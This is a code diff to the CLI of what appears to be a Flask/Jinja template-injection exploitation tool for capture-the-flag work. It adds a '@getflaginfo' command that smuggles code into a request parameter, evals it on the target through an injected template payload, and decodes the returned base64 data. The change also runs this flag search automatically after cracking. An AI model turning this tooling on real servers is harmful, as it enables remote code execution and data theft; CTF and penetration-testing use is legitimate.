@@ -1,17 +1,20 @@
 """命令行界面的入口"""
 
 import ast
+import base64
 import dataclasses
 import json
 import logging
 import random
 import string
+import re
 import time
 from urllib.parse import urlparse
 from typing import List, Dict, Tuple, Union, Any
 from enum import Enum
 from functools import partial
 from pathlib import Path
+from pprint import pformat
 
 
 from rich.markup import escape as rich_escape
@@ -24,12 +27,16 @@ from .const import (
     PythonVersion,
     ReplacedKeywordStrategy,
     DetectWafKeywords,
+    FLASK_CONTEXT_VAR,
+    ATTRIBUTE,
+    ITEM,
     OS_POPEN_READ,
     CONFIG,
     EVAL,
     STRING,
     DEFAULT_USER_AGENT,
     RENDER_ERROR_KEYWORDS,
+    GETFLAG_CODE_EVAL,
 )
 from .cracker import (
     Cracker,
@@ -54,6 +61,7 @@ from .submitter import (
     TCPSubmitter,
     JsonSubmitter,
     shell_tamperer,
+    ExtraParamAndDataCustomizable,
 )
 from .scan_url import yield_form
 from .webui import main as webui_main
@@ -144,6 +152,19 @@ def load_keywords_dotpy_safe(content: str) -> List[str]:
     return result
 
 
+def parse_getflag_info(html: str) -> Union[Dict, None]:
+    result_b64 = re.search(r"start([a-zA-Z0-9+/=]+?)stop", html)
+    if not result_b64:
+        return None
+    data = None
+    try:
+        result = base64.b64decode(result_b64.group(1))
+        data = json.loads(result)
+    except Exception:
+        return None
+    return {k: v for k, v in data.items() if v}
+
+
 def do_submit_cmdexec(
     cmd: str,
     submitter: Submitter,
@@ -166,11 +187,28 @@ def do_submit_cmdexec(
         str: 回显
     """
     payload, will_print = None, None
+    is_getflag_requested = False  # 用户是否用@getflaginfo一键梭flag
     # 解析命令
     if cmd[0] == "@":
         cmd = cmd[1:]
         if cmd.startswith("get-config"):
             payload, will_print = full_payload_gen_like.generate(CONFIG)
+        elif cmd.startswith("getflaginfo"):
+            if not isinstance(submitter, ExtraParamAndDataCustomizable):
+                logger.warning(
+                    "@getflaginfo is [red bold]not supported[/] for this",
+                )
+                return ""
+            is_getflag_requested = True
+            submitter.set_extra_param("eval_this", GETFLAG_CODE_EVAL)
+            payload, will_print = full_payload_gen_like.generate(
+                EVAL,
+                (
+                    ITEM,
+                    (ATTRIBUTE, (FLASK_CONTEXT_VAR, "request"), "values"),
+                    "eval_this",
+                ),
+            )
         elif cmd.startswith("eval"):
             payload, will_print = full_payload_gen_like.generate(
                 EVAL, (STRING, cmd[4:].strip())
@@ -207,22 +245,27 @@ def do_submit_cmdexec(
     if payload is None:
         logger.warning(
             "[red]Failed[/] generating payload.",
-            extra={"markup": True, "highlighter": None},
         )
         return ""
     logger.info(
         "Submit payload [blue]%s[/]",
         rich_escape(payload),
-        extra={"markup": True, "highlighter": None},
     )
     if not will_print:
         logger.warning(
             "Payload generator says that this payload "
             "[red]won't print[/] command execution result.",
-            extra={"markup": True, "highlighter": None},
         )
     result = submitter.submit(payload)
     assert result is not None
+    if is_getflag_requested:
+        flag_data = parse_getflag_info(result.text)
+        if isinstance(submitter, ExtraParamAndDataCustomizable):
+            submitter.unset_extra_param("eval_this")
+        if flag_data:
+            print(f"{flag_data=}")
+            return pformat(flag_data).strip()
+        return "GETFLAG_FAILED"
     return result.text
 
 
@@ -604,6 +647,17 @@ def do_crack(
         submitter=submitter,
         full_payload_gen_like=full_payload_gen,
     )
+    # TODO: provide an option to disable this
+    if isinstance(submitter, ExtraParamAndDataCustomizable):
+        logger.info(
+            "[yellow]Searching flags...[/]",
+        )
+        getflag_result = cmd_exec_func("@getflaginfo")
+        if getflag_result and getflag_result != "GETFLAG_FAILED":
+            logger.info("[cyan]This might be your [bold]flag[/]")
+            print(getflag_result)
+            logger.info("[cyan]No thanks[/]")
+            time.sleep(3)
     if exec_cmd:
         result = cmd_exec_func(exec_cmd)
         print(result)
